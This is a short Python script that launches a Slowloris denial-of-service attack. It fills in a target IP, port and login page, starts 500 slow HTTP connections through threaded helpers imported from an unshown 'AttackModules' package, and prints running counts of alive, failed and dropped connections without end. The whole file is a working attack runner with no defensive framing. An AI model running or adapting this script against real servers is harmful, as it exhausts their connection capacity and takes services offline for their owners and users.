from AttackModules import ThreadMaker, SlowlorisConnection
from time import sleep
import threading
import sys


target = <Target-IP>
port = <Target-port>
connection_count = 500
timeInterval = 2
uri = "login.php"   #write the uri in here. do not write '/' as the first character



sl = SlowlorisConnection()
slowcon_funcName= sl.create_slowlorisConnection

arguments = {}
arguments['target'] = target
arguments['port'] = port
arguments['uri'] = uri
arguments['timeinterval'] = timeInterval 
    

ce = ThreadMaker()
lunch = ce.lunch


thread_count = connection_count 
t = threading.Thread(target=lunch, args=(slowcon_funcName, arguments, thread_count, ))
t.start()

count = 0
while True:
    print("realtime count: "+str(count)+\
                "------ Slowloris Connection succeeded tries: #"+str(sl.connection_success_count)+\
                    "------ failed tries: #"+str(sl.connection_failed_count)+\
                        "------ droppped: #"+str(sl.connection_dropped_count)+\
                            "------ Alive: #"+str( sl.connection_success_count-sl.connection_failed_count- sl.connection_dropped_count))
    count+=1
    sleep(3)

